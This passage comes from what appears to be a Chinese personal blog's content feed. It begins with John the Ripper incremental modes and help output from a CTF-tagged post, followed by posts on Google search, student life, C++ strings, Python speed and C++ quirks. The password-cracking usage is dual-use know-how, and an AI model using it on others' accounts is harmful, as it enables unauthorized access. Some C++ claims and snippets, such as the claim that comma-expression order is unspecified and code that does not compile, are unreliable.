<span class="token number">95</span> printable ASCII charactersIncremental:alpha       <span class="token number">1</span>-8                  A-Z     纯大写字母Incremental:digits      <span class="token number">1</span>-8                  <span class="token number">0</span>-9     纯数字Incremental:lanman      <span class="token number">0</span>-7    A-Z, <span class="token number">0</span>-9, and some special characters   大写字母,数字加一些特殊字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>帮助手册：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Usage: john <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token punctuation">[</span>PASSWORD-FILES<span class="token punctuation">]</span>--single<span class="token punctuation">[</span><span class="token operator">=</span>SECTION<span class="token punctuation">[</span>,<span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token string">"single crack"</span> mode, using default or named rules<span class="token parameter variable">--single</span><span class="token operator">=</span>:rule<span class="token punctuation">[</span>,<span class="token punctuation">..</span><span class="token punctuation">]</span>        same, using <span class="token string">"immediate"</span> rule<span class="token punctuation">(</span>s<span class="token punctuation">)</span>--wordlist<span class="token punctuation">[</span><span class="token operator">=</span>FILE<span class="token punctuation">]</span> <span class="token parameter variable">--stdin</span>  wordlist mode, <span class="token builtin class-name">read</span> words from FILE or stdin                  <span class="token parameter variable">--pipe</span>   like --stdin, but bulk reads, and allows rules--loopback<span class="token punctuation">[</span><span class="token operator">=</span>FILE<span class="token punctuation">]</span>          like --wordlist, but extract words from a .pot <span class="token function">file</span>--dupe-suppression         suppress all dupes <span class="token keyword">in</span> wordlist <span class="token punctuation">(</span>and force preload<span class="token punctuation">)</span>--prince<span class="token punctuation">[</span><span class="token operator">=</span>FILE<span class="token punctuation">]</span>            PRINCE mode, <span class="token builtin class-name">read</span> words from FILE<span class="token parameter variable">--encoding</span><span class="token operator">=</span>NAME            input encoding <span class="token punctuation">(</span>eg. UTF-8, ISO-8859-1<span class="token punctuation">)</span>. See also                           doc/ENCODINGS and <span class="token parameter variable">--list</span><span class="token operator">=</span>hidden-options.--rules<span class="token punctuation">[</span><span class="token operator">=</span>SECTION<span class="token punctuation">[</span>,<span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span>     <span class="token builtin class-name">enable</span> word mangling rules <span class="token punctuation">(</span>for wordlist or PRINCE                           modes<span class="token punctuation">)</span>, using default or named rules<span class="token parameter variable">--rules</span><span class="token operator">=</span>:rule<span class="token punctuation">[</span><span class="token punctuation">;</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        same, using <span class="token string">"immediate"</span> rule<span class="token punctuation">(</span>s<span class="token punctuation">)</span>--rules-stack<span class="token operator">=</span>SECTION<span class="token punctuation">[</span>,<span class="token punctuation">..</span><span class="token punctuation">]</span> stacked rules, applied after regular rules or to                           modes that otherwise don<span class="token string">'t support rules--rules-stack=:rule[;..]   same, using "immediate" rule(s)--incremental[=MODE]       "incremental" mode [using section MODE]--mask[=MASK]              mask mode using MASK (or default from john.conf)--markov[=OPTIONS]         "Markov" mode (see doc/MARKOV)--external=MODE            external mode or word filter--subsets[=CHARSET]        "subsets" mode (see doc/SUBSETS)--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]--restore[=NAME]           restore an interrupted session [called NAME]--session=NAME             give a new session the NAME--status[=NAME]            print status of a session [called NAME]--make-charset=FILE        make a charset file. It will be overwritten--show[=left]              show cracked passwords [if =left, then uncracked]--test[=TIME]              run tests and benchmarks for TIME seconds each--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only--groups=[-]GID[,..]       load users [not] of this (these) group(s) only--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only--salts=[-]COUNT[:MAX]     load salts with[out] COUNT [to MAX] hashes--costs=[-]C[:M][,...]     load salts with[out] cost value Cn [to Mn]. For                           tunable cost parameters, see doc/OPTIONS--save-memory=LEVEL        enable memory saving, at LEVEL 1..3--node=MIN[-MAX]/TOTAL     this node'</span>s number range out of TOTAL count<span class="token parameter variable">--fork</span><span class="token operator">=</span>N                   fork N processes<span class="token parameter variable">--pot</span><span class="token operator">=</span>NAME                 pot <span class="token function">file</span> to use<span class="token parameter variable">--list</span><span class="token operator">=</span>WHAT                list capabilities, see <span class="token parameter variable">--list</span><span class="token operator">=</span>help or doc/OPTIONS<span class="token parameter variable">--format</span><span class="token operator">=</span>NAME              force <span class="token builtin class-name">hash</span> of <span class="token builtin class-name">type</span> NAME. The supported formats can                           be seen with <span class="token parameter variable">--list</span><span class="token operator">=</span>formats and <span class="token parameter variable">--list</span><span class="token operator">=</span>subformats<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> 安全 </tag>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个限制Google搜索结果语言的小技巧</title>
      <link href="/2021/11/11/yi-ge-xian-zhi-google-sou-suo-jie-guo-yu-yan-de-xiao-ji-qiao/"/>
      <url>/2021/11/11/yi-ge-xian-zhi-google-sou-suo-jie-guo-yu-yan-de-xiao-ji-qiao/</url>
      
        <content type="html"><![CDATA[<p>Google 中文搜索时会忽略一些介词如“的”</p><p>比如我们要搜索</p><p><code>ISO C++ 20 GNU C++20</code></p><p>时，就可以直接搜</p><p><code>ISO C++ 20 GNU C++20 的</code></p><p>就是中文结果了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Google </tag>
            
            <tag> 技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何废掉一个大学生？</title>
      <link href="/2021/11/11/ru-he-fei-diao-yi-ge-da-xue-sheng/"/>
      <url>/2021/11/11/ru-he-fei-diao-yi-ge-da-xue-sheng/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="如何废掉一个大学生">如何废掉一个大学生？</h1><h3 id="使劲看片">1、使劲看片。</h3><p>躺着看、坐着看、吃饭也看，各种类型的电影、电视剧无休止的追，在享受中废掉。</p><h3 id="给他一部手机">2、给他一部手机。</h3><p>连上WiFi，就可以肥宅快乐一整天，门都可以不出。</p><h2 id="永远明天再说">3、永远“明天再说”。</h2><p>一不小心睡了懒觉，错过了计划时间，就拿这个当借口继续睡，把原本的计划拖到明天。</p><h2 id="间接性努力持续性堕落">4、间接性努力，持续性堕落。</h2><p>凡事一时兴起，三分钟热度，常常自我感动。左手拿着书本，右手发着朋友圈，看着大学时间一点点流逝，在自我欺骗中颓废。</p><h3 id="没课就躺床">5、没课就躺床。</h3><p>床绝对是懒人的天堂、睡觉的神器，只要躺在上面，什么学习、运动都与他无关，养成没事躺床的习惯，人就废了。</p><h3 id="每天过夜生活">6、每天过“夜生活”。</h3><p>白天要上课，到了晚上就榨干时间，不熬到极限不睡觉。结果早上起不来、上课没精神，整天迷迷糊糊，挂着标志的黑眼圈，陷入恶循环。</p><h3 id="忍不住剁手">7、忍不住剁手。</h3><p>看到喜欢的就买下来、没事往游戏里充钱，超前消费的额度有多少就花多少。很快，物质上的匮乏和欠债，会让他不击而溃。</p><h3 id="送他一个对象">8、送他一个对象。</h3><p>约会什么的都给他安排上，让他对恋爱产生依赖，只要时间长了成为感情机器，学习时间被压缩，就会慢慢沦落。</p><h2 id="不接受比自己厉害的人">9、不接受比自己厉害的人。</h2><p>爱面子，无法和那些优秀的同学相处，更不愿意向他们请教。一个人如果只和比自己差不多的人待在一起，他的眼界和学识也会局限在原地。</p><h2 id="活在别人的眼光里">10、活在别人的眼光里。</h2><p>经常因同学、老师的一句话而耿耿于怀，心里反复揣测他们的意思。这样，只会让自己的精力消耗在无用的事情上。</p><p>别人的话，或许只是随口一说，他却白白浪费了好一天的心情。</p><h3 id="游戏组队拉上他">11、游戏组队拉上他。</h3><p>如果自制力不强，并且让他感受到了游戏的快乐，很快就有第二次哈哈~下次即使没人组队，他也会玩得津津有味、不亦乐乎，最后彻底沦陷。</p><h3 id="作业答案都靠抄">12、作业、答案都靠抄。</h3><p>抄着抄着，连课上到哪都不知道，四年下来，一点东西没学到。</p><h3 id="总拿别人安慰自己">13、总拿别人安慰自己。</h3><p>看别人打游戏，他也跟着打；看别人不上课，他也不去上。心里想着：“别人都不担心，我担心什么？”，殊不知，别人一毕业就回去继承家业，他还是个刚出社会的打工人。</p><h3 id="害怕挑战">14、害怕挑战。</h3><p>创业大赛不敢参加、表演舞台不敢上......不想学习和接触新的东西，认知保守，现在可能看不出什么，但几年后的差距一定很大。</p><p>就像我以前看别人理财获得了收获，却一直不敢尝试。后来决心也要获得闲余收入，不断研究实践，终于让我获得了不错的回报。</p><h3 id="认为读书无用">15、认为读书无用。</h3><p>觉得不读书也可以创业开公司，有没有学历都一样。这也就算了，他不读书还不去学点别的，整天吃喝玩乐度日，荒废青春。</p><h3 id="习惯安逸">16、习惯安逸。</h3><p>怎么安逸怎么来，每天无所事事，不知道做什么，也不知道怎么做。</p><p>平平淡淡的上课下课，会让他觉得学习没意义，一旦这种认知形成，就会在碌碌无为、安于现状中丧失斗志。</p><h3 id="讨好别人害怕孤独">17、讨好别人，害怕孤独。</h3><p>同学叫他帮丢垃圾他也丢，叫他打饭游戏他就打，好像没有自己的思想。</p><p>一而再，再而三，他成为了背锅小能手、同学的私人助理，等他也需要帮助时，却没有人愿意搭理他。</p><h3 id="捧杀让他在骄傲中颓废">18、捧杀，让他在骄傲中颓废。</h3><p>不管做的怎么样，都夸他做得对，让他沉浸在无限的吹捧和荣耀中，得意自大。等真正失败的那天，巨大的落差会把他打回原形，瞬间崩溃。</p><h3 id="疯狂加社团学生会">19、疯狂加社团、学生会。</h3><p>早上这里要开会，中午那里要开会，跑来跑去连自己的学业都顾不上。本以为能增加人脉，结果认识的没几个，反倒成了随叫随到的工具人。</p><h2 id="高估能力低估自己">20、高估能力，低估自己。</h2><p>看别人很简单就做到的事情，觉得自己也能轻松做到；听到一件很难的事情，就一口否认自己肯定办不到。结果一上手，原来这东西这么难，原来这也很简单，远远超出他对事情的预估。这样的人，迟早会在自负和自卑中废掉。</p><h2 id="急于求成">21、急于求成。</h2><p>刚写小说第一章，就希望它能火； 刚接触琴谱，就想当天学会。这样的同学，刚开始行动，就恨不得马上得到回报。一旦结果有违自己的期望值，就会开始放弃，自我怀疑，很难踏实做好一件事。</p><h3 id="拒绝正视自己">22、拒绝正视自己。</h3><p>作业不给他抄，怨同学；不给他打饭，怪室友。</p><p>怪来怪去，都不承认自己的错误，最后的结果就是所有人离他而去。</p><h3 id="不愿思考">23、不愿思考。</h3><p>连搜索都懒，遇到问题，只想直接从别人那里得到答案。当一个人的思维认知出现停滞，就注定很难进步。</p><h2 id="完美主义">24、完美主义。</h2><p>考一堆用不上的证书、无条件结识朋友、什么都想要做到最好。但越是这样，越得不到，这些没有意义的付出，最后将会使人自我怀疑，全盘皆输。</p><h2 id="过高的期待">25、过高的期待。</h2><p>当一个人把所有时间都用在同件事上时，就会忽视其它方面的发展，祈求做出成绩。对于寄予厚望的事情，如果成功了还好，做不出来，他就会崩溃。</p><h3 id="追求短期小利忽视长期价值">26、追求短期小利，忽视长期价值。</h3><p>为了兼职，不惜想尽办法逃课、早退，去当廉价劳动力。虽然零花钱是多了，吃苦精神值得鼓励，但以牺牲学业的代价，其实一点都不值当。</p><h2 id="永远迷茫什么都想要">27、永远迷茫，什么都想要。</h2><p>很多人都是矛盾结合体，想干这个又想干那个，结果到毕业，都不知道自己喜欢什么、能干什么，白白荒废了大学这几年。</p><h3 id="持续不良的生活习惯">28、持续不良的生活习惯。</h3><p>每天炸鸡汉堡、熬夜刷剧，造成身体质量下降，是废掉自己最快的方式。</p><p>身体是本钱。</p><h3 id="真正废掉大学生的不是诱惑而是认知的落伍">29、真正废掉大学生的，不是诱惑，而是认知的落伍。</h3><p>那些娱乐的推送，他可以不看。 放在桌上的手机，他可以不玩。摆在眼前的贿赂，他可以不收。 一个人认为读书无用，什么书都入不了眼；</p><p>但他若想出人头地，应该没有人能拦得住。</p><h2 id="你看废掉一个人轻而易举">30、你看，废掉一个人轻而易举。</h2><h2 id="只要一不小心陷入欲望就难以挣脱">只要一不小心陷入欲望，就难以挣脱。</h2>]]></content>
      
      
      <categories>
          
          <category> 有感 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大学 </tag>
            
            <tag> 哲学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++字符串数组</title>
      <link href="/2021/11/11/c-zi-fu-chuan-shu-zu/"/>
      <url>/2021/11/11/c-zi-fu-chuan-shu-zu/</url>
      
        <content type="html"><![CDATA[<h2 id="c字符串数组">C++字符串数组</h2><h3 id="字符指针">字符指针</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Hello World!"</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>str <span class="token operator">=</span> <span class="token string">"Hello world"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>理解：字符串指针变量本身是一个变量，<strong>用于存放字符串的首地址</strong>。而字符串本身是存放在以该首地址为首的一块连续的内存空间中并以0 作为串的结束。</p><ul><li>*<strong>a只是指向一个字符</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">char</span> <span class="token operator">*</span>a<span class="token operator">=</span> <span class="token string">"bcd"</span> <span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输出字符：%c \n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*输出字符，使用"%c"*/</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输出字符：%c \n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*输出字符，使用"%c"*/</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输出字符串：%s \n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/*输出字符串，使用"%s"；而且a之前不能有星号"*"  */</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-none"><code class="language-none">输出字符：b 输出字符：c 输出字符串：bcd <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><strong>若字符串常量出现在在表达式中，代表的值为该字符串常量的第一个字符的地址</strong></li></ul><h3 id="字符数组">字符数组</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Iamhappy"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>理解：<strong>字符数组是由若干个数组元素组成的</strong>，它可用来存放整个字符串。（即用字符数组来存放字符串）。</p><ul><li>这种字符数组只能在字符数组初始化时使用，字符数组的赋值只能对其元素一一赋值。</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token char">'I'</span><span class="token punctuation">,</span><span class="token char">''</span><span class="token punctuation">,</span><span class="token char">'a'</span><span class="token punctuation">,</span><span class="token char">'m'</span><span class="token punctuation">,</span><span class="token char">''</span><span class="token punctuation">,</span><span class="token char">'h'</span><span class="token punctuation">,</span><span class="token char">'a'</span><span class="token punctuation">,</span><span class="token char">'p'</span><span class="token punctuation">,</span><span class="token char">'p'</span><span class="token punctuation">,</span><span class="token char">'y'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>错误的赋值方式：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>str <span class="token operator">=</span> <span class="token string">"Iamhappy"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="总结">总结</h3><p>在C语言，有两种方式表示和存放一个字符串</p><ul><li>用字符数组存放一个字符串</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"I love u"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数组名就是字符串的首地址</p><ul><li>用字符指针指向一个字符串</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token operator">*</span>str <span class="token operator">=</span> <span class="token string">"I love u"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指针变量就是字符串的首地址</p><blockquote><p>两种表示方式的字符串输出都用：printf（"%sn", str); %s表示输出一个字符串，给出字符指针变量名str（对于第一种表示方法，字符数组名即是字符数组的首地址，与第二种中的指针意义是一致的），则系统先输出它所指向的一个字符数据，然后自动使str 自动加 1，使之指向下一个字符...，如此，直到遇到字符串结束标识符 0。</p></blockquote><h3 id="字符串指针数组">字符串指针数组</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Hello"</span><span class="token punctuation">,</span> <span class="token string">"C++"</span><span class="token punctuation">,</span> <span class="token string">"World"</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">// char (*str)[] = ...</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><strong>char*str[]</strong>：表示str是数组，数组中的元素是指针，指向char类型</li><li><strong>str+1</strong>：表示str的第二个元素的内存地址，所以是加8字节</li><li>*(str+1)：表示数组的第二个元素的内容（是个char类型的指针，表示C++字符串的地址）</li><li><code>*(*(str+1)+2)</code>：表示数组的第二个元素的内容（char指针），指向的第三个字符（C++中的第二个+）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 编程 </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提高Python运行效率</title>
      <link href="/2021/11/11/ti-gao-python-yun-xing-xiao-lu/"/>
      <url>/2021/11/11/ti-gao-python-yun-xing-xiao-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="提高python运行效率">提高Python运行效率</h1><p>Python 是一门解释执行语言，因此用 Python 编写的程序会比同样功能的 C++等语言编写的运行缓慢。</p><p>但是我们有一些简单的的方法能够最大限度地抹平这个差异，从而使您在能够快速编写程序的同时也能使程序的运行效率最高。</p><ol type="1"><li>使用 PyPy</li></ol><p>PyPy 是一个以 Python 编写的 Python 语言的 JIT编译器。对于具有大量循环和重复操作的程序，使用 PyPy可以让执行效率获得成倍的提升。</p><p>有关 PyPy 的安装和具体使用方法，请参见 <a href="https://pypy.org/">https://pypy.org/</a>。</p><ol start="2" type="1"><li>在 Python2 中，使用<code>xrange</code>代替<code>range</code></li></ol><p>如果您使用 Python2，需要执行大循环时，可以使用<code>xrange</code>代替<code>range</code>函数，这可以避免一个很大的循环数组被生成。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++反人类特性盘点</title>
      <link href="/2021/11/10/c-fan-ren-lei-te-xing-pan-dian/"/>
      <url>/2021/11/10/c-fan-ren-lei-te-xing-pan-dian/</url>
      
        <content type="html"><![CDATA[<h2 id="cc-匪夷所思的特性们">C/C++ 匪夷所思的特性们</h2><h3 id="逗号表达式">逗号表达式</h3><p>形如</p><p><code>(exp1, exp2, exp3)</code></p><p>的表达式的返回值是 <code>exp3</code> ，毋庸置疑。</p><p>但在：</p><p><code>(func1, func2, func3)</code> 中。</p><p>三个函数的执行顺序却是未规定的，换句话说，C++的编译器可以任意、随意地规定三个函数的执行顺序。</p><p>这非常致命，因为这可能会导致我们的结果偏离预期。</p><p>见样例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    string str<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>cin <span class="token operator">&gt;&gt;</span> str<span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'*'</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token function">remove</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个程序写的非常难以阅读，但其的效果是<strong>统计一个字符串中有多少个<em>，并输出该字符串去掉</em>后的新字符串</strong></p><p>观察代码，并没有不妥之处。本地运行，输出也符合期望。但提交却提示答案错误。</p><p>结合上文的经验，我们把代码修改为：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    string str<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>cin <span class="token operator">&gt;&gt;</span> str<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'*'</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        str<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token function">remove</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> str <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时答案正确。</p><p>为什么呢，可以发现原程序 <strong>Line 12</strong> 逗号表达式中的<code>str.erase(remove(str.begin(), str.end(), '*'), str.end()), str</code>语句有可能在 <code>count()</code> 返回结果前就伤害了 <code>str</code>。从而导致其返回未预期的结果。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 编程 </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>锐格题解合集</title>
      <link href="/2021/11/10/rui-ge-ti-jie-he-ji/"/>
      <url>/2021/11/10/rui-ge-ti-jie-he-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="锐格代码合集">锐格代码合集</h3><h4 id="实验11-函数-2">实验11 函数-2</h4><h5 id="section">5789</h5><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">func_xx</span><span class="token punctuation">(</span><span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//start</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> temp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        temp <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            b<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        b<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment">//end</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 